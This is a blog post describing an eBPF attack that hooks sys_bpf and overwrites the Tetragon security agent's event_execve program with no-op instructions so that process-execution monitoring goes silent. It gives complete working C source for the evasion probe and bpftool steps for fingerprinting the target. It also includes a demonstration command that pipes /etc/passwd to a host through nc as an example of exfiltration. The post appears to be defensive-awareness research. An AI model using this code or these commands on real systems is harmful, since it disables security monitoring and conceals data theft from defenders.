## eBPF: A Case of Self-Sabotage

### Introduction

In recent years, the Extended Berkeley Packet Filter (eBPF) has become an essential tool in the Linux kernel for performance monitoring, networking, and security. However, as with any powerful technology, it can be turned against itself if misused or exploited. This blog post explores a fascinating attack vector where eBPF is used against itself and manipulated to sabotage its own programs by exploiting the `sys_bpf` system call.

### Understanding eBPF and `bpf(2)`

eBPF allows users to run sandboxed programs in kernel space. Though these programs do not have access to all kernel functions, they can perform a variety of tasks ranging from tracing system calls to filtering network packets. eBPF programs are encoded in a bytecode-like language and are loaded into the kernel via the `bpf(2)` system call.

The `bpf(2)` system call provides userspace with an interface to load, manipulate, and manage eBPF programs and maps:

```c
#include <linux/bpf.h>

int bpf(int cmd, union bpf_attr *attr, unsigned int size);
```

 When a user wants to load an eBPF program, they provide a pointer to an array of `union bpf_insn`, which contains the intructions for the eBPF virtual machine to execute.

### The Role of `union bpf_attr`

`union bpf_attr` plays a crucial role in conveying parameters about eBPF programs from userspace to the kernel. This structure is used by the `bpf(2)` system call to pass various attributes and parameters related to eBPF programs and maps. Relevant to this discussion is how `union bpf_attr` is used for:

- **Program Loading**: When loading an eBPF program, the `bpf_attr` uniuon contains information such as the pointer to the array of instructions (`insns`), the number of instructions (`insn_cnt`), and the type of program (`prog_type`).
- **Map Creation and Management**: For map operations, `bpf_attr` holds attributes such as the map type (`map_type`), key size (`key_size`), value size (`value_size`), and the maximum number of entries (`max_entries`).
- **Program Attachment**: When attaching an eBPF program to a specific hook point, `bpf_attr` includes fields such as the target file descriptor (`target_fd`), the attach type (`attach_type`), and the program file descriptor (`prog_fd`).

Here's a simplified version of the `struct bpf_attr` definition:

```c
union bpf_attr {
    struct { /* anonymous struct used by BPF_PROG_LOAD command */
        __u32 prog_type;
        __u32 insn_cnt;
        __u64 insns;
        __u64 license;
        __u32 log_level;
        __u32 log_size;
        __u64 log_buf;
        __u32 kern_version;
        __u32 prog_flags;
    };
    // Other command-specific structs
};
```

This structure allows userspace applications to convey a wide range of parameters and configurations to the kernel when performing eBPF operations. The versatility and flexibility of struct `bpf_attr` are key to the powerful capabilities of eBPF.

### The Attack: Rewriting bpf Programs as No-Op Slides
In this attack, the adversary hooks the `sys_bpf` kernel function, which is used to service `bpf(2)` from userspace, to alter the behavior of eBPF programs. By doing so, they can effectively nullify specific eBPF programs by rewriting their instructions to be effective no-op operations. Here’s a rough outline of how it works:

1. Hook `sys_bpf`: Place a hook on `sys_bpf` via the `sys_enter` tracepoint. Other attachment types are possible, but tracepoints have wider support.

2. Intercept eBPF Programs: When an eBPF program is loaded, our tracepoint intercepts the user mode pointer that contains the `struct bpf_insn` array.

3. Modify User Instructions: The pointer is overwritten via `bpf_probe_write_user` to replace the original eBPF instructions with effective no-op instructions. This is typically done by altering the code field in struct bpf_insn to `BPF_ALU | BPF_MOV | BPF_K`, which represents a move immediate instruction that does nothing.

4. Target Specific Programs: To avoid detection, the attacker can target individual programs by matching on the `insn_cnt` field, which indicates the number of instructions in the eBPF program. By comparing this value, the attacker can selectively modify only certain programs. Loaded programs can be listed via `bpftool prog list`.

### Technical Breakdown

Let’s dive into an example of how this attack could be implemented. Let's target the Isovalent security agent, Tetragon.

#### Finding a Target Program

After starting Tetragon, we see the following bpf program is loaded:

```shell
> bpftool prog list
tracepoint  name event_execve  tag bf21fa49f817a040  gpl
	loaded_at 2024-07-19T11:36:08-0400  uid 0
	xlated 16456B  jited 10176B  memlock 20480B  map_ids 35,8,9,11,31,13,14,32,33,7,12
	btf_id 89
```

`event_execve` seems like a good target; let's target it by finding out how many instructions are in the program:

```shell
> sudo bpftool prog dump xlated tag bf21fa49f817a040 | tail -1

 15874: (95) exit
```
 
The number before the colon (`15874`) is the instruction count. We can now write a bpf program specifically targeting Tetragon `event_execve` programs.

```c
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>
#include "zeroprobe.h"

/* Instruction count of Tetragon event_execve */
#define TARGET_BPF_INSNS 15874

#define BPF_ALU64 0x07
#define BPF_EXIT 0x95

#ifndef BPF_MOV
#define BPF_MOV 0xb0
#endif

#ifndef BPF_K
#define BPF_K 0x00
#endif

char LICENSE[] SEC("license") = "Dual BSD/GPL";

SEC("tp/syscalls/sys_enter_bpf")
int handle_bpf_enter(struct trace_event_raw_sys_enter *ctx)
{
        int cmd = ctx->args[0];
        size_t insns_cnt = 0;

        if (cmd == BPF_PROG_LOAD) {
                /* See how many bpf instructions userspace intended to load */
                union bpf_attr uattr;
                bpf_probe_read_user(&uattr, sizeof(union bpf_attr), (void *)ctx->args[1]);

                struct bpf_insn insn;

                u32 insn_cnt = uattr.insn_cnt;
                // Is this our target program?
                if (insn_cnt != TARGET_BPF_INSNS) {
                        return 0;
                }

                // Iterate over the instructions passed by userspace and convert them to no-ops.
                for (__u32 i = 0; i < TARGET_BPF_INSNS; i++) {
                        bpf_probe_read_user(&insn, sizeof(insn), &((struct bpf_insn *)uattr.insns)[i]);

                        // Overwrite the user bpf_insn with a no-op instruction
                        struct bpf_insn nop_insn = {
                                .code = BPF_ALU64 | BPF_MOV | BPF_K,
                                .dst_reg = BPF_REG_0,
                                .src_reg = BPF_REG_0,
                                .off = 0,
                                .imm = 0
                        };

                        // The last instruction has to be a jmp or exit
                        if (i == insn_cnt-1) {
                                nop_insn.code = BPF_EXIT;
                        }

                        bpf_probe_write_user(&((struct bpf_insn *)uattr.insns)[i], &nop_insn, sizeof(nop_insn));
                }
        }

        return 0;
} 
```

Let's test it out! First, execute some commands without our probe installed. Make sure Tetragon is running first, then start `tetra` to view events in real time:


```shell
> sudo tetra getevents --output compact
```

In another window, run a command that exfiltrates sensitive data:
```shell
> cat /etc/passwd | nc 127.0.0.1 8080
```

Returning back to the `tetra` window, there will be events for the commands just executed:

```shell
> sudo tetra getevents --output compact
🚀 process  /usr/bin/nc 127.0.0.1 8080
🚀 process  /usr/bin/cat /etc/passwd
💥 exit     /usr/bin/cat /etc/passwd 0
💥 exit     /usr/bin/nc 127.0.0.1 8080 1
```

Let's load our eBPF program to intercept Tetragon's execution events and convert them to no-ops.

Stop Tetragon, load the program, restart Tetragon and run the same exfiltration command:

```shell
> cat /etc/passwd | nc 127.0.0.1 8080
```

In the `tetraà window, we only process `exit` events! No execution events are present.

```
> sudo tetra getevents --output compact
💥 exit     /usr/bin/bash  0
💥 exit     /usr/bin/bash  1
```

